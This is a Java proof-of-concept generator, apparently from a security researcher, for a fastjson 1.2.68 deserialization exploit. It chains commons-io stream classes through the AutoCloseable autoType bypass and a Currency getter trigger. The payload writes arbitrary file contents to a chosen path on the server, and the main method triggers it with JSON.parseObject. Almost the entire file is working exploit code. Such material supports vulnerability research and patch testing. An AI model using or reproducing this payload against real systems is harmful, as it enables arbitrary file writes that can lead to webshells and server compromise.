package test;

import com.alibaba.fastjson.JSON;
import org.apache.commons.io.FileUtils;
import java.io.File;
import java.io.IOException;

/**
 * fastjson 1.2.68 autocloseable commons-io<=2.4 poc 生成工具类
 *
 * @author su18
 */
public class Fastjson7_io_write_3 {
	//<=1.2.68 and commons-io
	public static final String AUTOCLOSEABLE_TAG = "\"@type\":\"java.lang.AutoCloseable\",";
	/**
	 * 在 payload 外包裹一层绕过指定类型
	 *
	 * @param payload payload
	 * @return 返回结果
	 */
	public static String bypassSpecializedClass(String payload) {
		return "{\"su18\":" + payload + "}";
	}
	/**
	 * 使用 Currency 类解析调用 "currency" 中 value 的 toString 方法，使用 JSONObject 方法调用 toJSONString
	 *
	 * @param payload payload
	 * @return 返回结果
	 */
	public static String useCurrencyTriggerAllGetter(String payload, boolean ref) {
		return String.format("{\"@type\":\"java.util.Currency\",\"val\":{\"currency\":%s%s}}%s",
				(ref ? "" : "{\"su19\":"), payload, (ref ? "" : "}"));
	}


	/**
	 * 生成 CharSequenceInputStream 反序列化字符串
	 *
	 * @param content 写入内容
	 * @param ref     是否使用引用对象
	 * @return 返回结果
	 */
	public static String generateCharSequenceInputStream(String content, boolean ref) {
		int mod = 8192 - content.length() % 8192;

		StringBuilder contentBuilder = new StringBuilder(content);
		for (int i = 0; i < mod+1; i++) {
			contentBuilder.append(" ");
		}

		return String.format("{%s\"@type\":\"org.apache.commons.io.input.CharSequenceInputStream\"," +
						"\"charset\":\"UTF-8\",\"bufferSize\":4,\"s\":{\"@type\":\"java.lang.String\"\"%s\"}",
				ref ? AUTOCLOSEABLE_TAG : "", contentBuilder);
	}


	/**
	 * 生成 FileWriterWithEncoding 反序列化字符串
	 *
	 * @param filePath 要写入的文件位置
	 * @param ref      是否使用引用对象
	 * @return 返回结果
	 */
	public static String generateFileWriterWithEncoding(String filePath, boolean ref) {
		return String.format("{%s\"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\"," +
				"\"file\":\"%s\",\"encoding\":\"UTF-8\"}", ref ? AUTOCLOSEABLE_TAG : "", filePath);
	}

	/**
	 * 生成 WriterOutputStream 反序列化字符串
	 *
	 * @param writer writer 对象反序列化字符串
	 * @param ref    是否使用引用对象
	 * @return 返回结果
	 */
	public static String generateWriterOutputStream(String writer, boolean ref) {
		return String.format("{%s\"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\"writeImmediately\":true," +
						"\"bufferSize\":4,\"charsetName\":\"UTF-8\",\"writer\":%s}",
				ref ? AUTOCLOSEABLE_TAG : "", writer);
	}


	/**
	 * 生成 TeeInputStream 反序列化字符串
	 *
	 * @param inputStream  inputStream 类
	 * @param outputStream outputStream 类
	 * @param ref          是否使用引用对象
	 * @return 返回结果
	 */
	public static String generateTeeInputStream(String inputStream, String outputStream, boolean ref) {
		return String.format("{%s\"@type\":\"org.apache.commons.io.input.TeeInputStream\",\"input\":%s," +
				"\"closeBranch\":true,\"branch\":%s}", ref ? AUTOCLOSEABLE_TAG : "", inputStream, outputStream);
	}


	/**
	 * 生成 BOMInputStream 反序列化字符串
	 *
	 * @param inputStream inputStream 类
	 * @param size        读取 byte 大小
	 * @return 返回结果
	 */
	public static String generateBOMInputStream(String inputStream, int size) {

		int nums = size / 8192;
		int mod  = size % 8192;

		if (mod != 0) {
			nums = nums + 1;
		}

		StringBuilder bytes = new StringBuilder("0");
		for (int i = 0; i < nums * 8192; i++) {
			bytes.append(",0");
		}
		return String.format("{%s\"@type\":\"org.apache.commons.io.input.BOMInputStream\",\"delegate\":%s," +
						"\"boms\":[{\"charsetName\":\"UTF-8\",\"bytes\":[%s]}]}",
				AUTOCLOSEABLE_TAG, inputStream, bytes);
	}


	/**
	 * 读取文件内容字符串
	 *
	 * @param file 文件路径
	 * @return 返回字符串
	 */
	public static String readFile(File file) {
		String result = "";

		try {
			result = FileUtils.readFileToString(file);
		} catch (IOException e) {
			e.printStackTrace();
		}

		return result;
	}


	/**
	 * 生成普通 payload
	 *
	 * @param payloadFile    写入文件本地存储位置
	 * @param targetFilePath 写出目标文件位置
	 * @return 返回 payload
	 */
	public static String generatePayload(String payloadFile, String targetFilePath) {
		File   file        = new File(payloadFile);
		String fileContent = readFile(file);
		if (!"".equals(fileContent)) {
			return bypassSpecializedClass(
					useCurrencyTriggerAllGetter(
							generateBOMInputStream(
									generateTeeInputStream(generateCharSequenceInputStream(fileContent, false),
											generateWriterOutputStream(
													generateFileWriterWithEncoding(targetFilePath, false),
													false),
											false),
									(int) file.length()),
							false));
		}

		return "";
	}

	/**
	 * 生成引用型 payload
	 *
	 * @param payloadFile    写入文件本地存储位置
	 * @param targetFilePath 写出目标文件位置
	 * @return 返回 payload
	 */
	public static String generateRefPayload(String payloadFile, String targetFilePath) {
		File   file        = new File(payloadFile);
		String fileContent = readFile(file);
		if (!"".equals(fileContent)) {
			return bypassSpecializedClass(
					useCurrencyTriggerAllGetter(
							"{\"writer\":" + generateFileWriterWithEncoding(targetFilePath, true) +
									",\"outputStream\":" + generateWriterOutputStream("{\"$ref\":\"$.currency.writer\"}", true) +
									",\"charInputStream\":" + generateCharSequenceInputStream(fileContent, true) +
									",\"teeInputStream\":" + generateTeeInputStream("{\"$ref\":\"$.currency.charInputStream\"}", "{\"$ref\":\"$.currency.outputStream\"}", true) +
									",\"inputStream\":" + generateBOMInputStream("{\"$ref\":\"$.currency.teeInputStream\"}", (int) file.length()) + "}"
							, true
					)
			);
		}

		return "";

	}


	public static void main(String[] args) {
		String file   = "1.txt";
		String target = "2.txt";

		// 正常调用 payload 生成
		String payload = generatePayload(file, target);

		// 引用类型 payload 生成
		String payloadWithRef = generateRefPayload(file, target);
		System.out.println(payloadWithRef);
//		以下三种调用方式均可兼容，触发反序列化
//		JSON.parse(payloadWithRef);
		JSON.parseObject(payloadWithRef);
//		JSON.parseObject(payloadWithRef,POC.class);
	}

}
